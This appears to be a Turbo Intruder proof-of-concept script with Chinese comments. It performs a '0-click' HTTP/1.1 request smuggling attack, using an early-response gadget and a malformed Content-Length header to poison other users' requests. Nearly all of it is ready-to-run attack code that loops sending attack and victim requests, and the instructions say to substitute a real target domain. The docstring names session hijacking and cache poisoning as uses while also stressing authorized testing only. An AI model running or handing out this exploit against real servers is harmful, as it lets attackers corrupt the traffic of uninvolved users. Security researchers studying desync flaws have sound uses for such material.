"""
0-Click漏洞概念验证脚本 - Turbo Intruder

功能说明：
这是一个用于演示和测试0-Click漏洞（零点击漏洞）的概念验证脚本。
0-Click漏洞是一种HTTP请求走私攻击的变种，可以在不需要用户交互的情况下毒化其他用户的请求。

攻击原理：
1. 利用HTTP/1.1协议的解析差异
2. 通过Content-Length头部操控实现请求走私
3. 将恶意载荷注入到受害者的请求中
4. 实现对其他用户请求的毒化

技术细节：
- 使用早期响应小工具（early-response gadget）
- 操控Content-Length头部值
- 利用连接复用特性
- 实现请求边界混淆

使用场景：
- HTTP请求走私漏洞测试
- 0-Click攻击概念验证
- Web缓存毒化测试
- 会话劫持攻击
- 权限绕过测试

参数配置：
- concurrentConnections: 5（并发连接数）
- requestsPerConnection: 1（每连接单请求）
- engine: Engine.BURP（使用Burp网络栈）
- pipeline: False（禁用管道）
- timeout: 15秒（较长超时等待响应）

攻击组件：
1. attack: 包含早期响应小工具和可操控的Content-Length头部
2. smuggledLine: 要走私的恶意请求行
3. victim: 受害者请求模板

安全注意：
- 仅用于授权的安全测试
- 可能影响其他用户的请求
- 需要在隔离环境中测试
- 遵守负责任的漏洞披露原则

参考资料：
https://portswigger.net/research/http1-must-die

使用方法：
1. 修改attack中的目标域名和路径
2. 自定义smuggledLine为要走私的请求
3. 调整victim请求模板
4. 运行脚本观察毒化效果
"""

def queueRequests(target, wordlists):
    # 创建0-Click攻击引擎
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,        # 并发连接数
                           requestsPerConnection=1,         # 每连接单请求
                           engine=Engine.BURP,              # 使用Burp网络栈
                           pipeline=False,                  # 禁用管道
                           maxRetriesPerRequest=0,          # 不重试
                           timeout=15                       # 15秒超时
                           )


    # 攻击请求应包含早期响应小工具和Content-Length头部（值设为%s）
    attack = '''POST /con HTTP/1.1
Host: example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length : %s

'''

    # 自定义此行以获得所需的毒化响应
    smuggledLine = 'GET /404 HTTP/1.1'

    # 如需要可添加额外头部
    victim = '''GET / HTTP/1.1
Host: example.com

'''

    # 以下代码无需编辑
    if '%s' not in attack:
        raise Exception('请在Content-Length头部值中放置%s占位符')

    if not attack.endswith('\r\n\r\n'):
        raise Exception('攻击请求必须以空行结尾且不包含请求体')

    # 将走私行注入到受害者请求中
    victim = victim.replace('\r\n', '\r\nA: A'+smuggledLine+'\r\n', 1)

    # 持续发送攻击和受害者请求
    while True:
        engine.queue(attack, victim.index(smuggledLine), label='attack', fixContentLength=False)
        engine.queue(victim, label='victim')


def handleResponse(req, interesting):
    # 记录所有响应用于分析0-Click攻击效果
    table.add(req)

    # 如果希望攻击成功时自动停止，可以取消注释并自定义以下代码
    # 示例：当受害者请求返回404时停止攻击（表示走私成功）
    #if req.label == 'victim' and req.status == 404:
    #    req.engine.cancel()  # 停止攻击引擎

    # 其他成功指标示例：
    # - 特定的响应内容
    # - 异常的响应头部
    # - 意外的状态码
    # - 响应时间异常

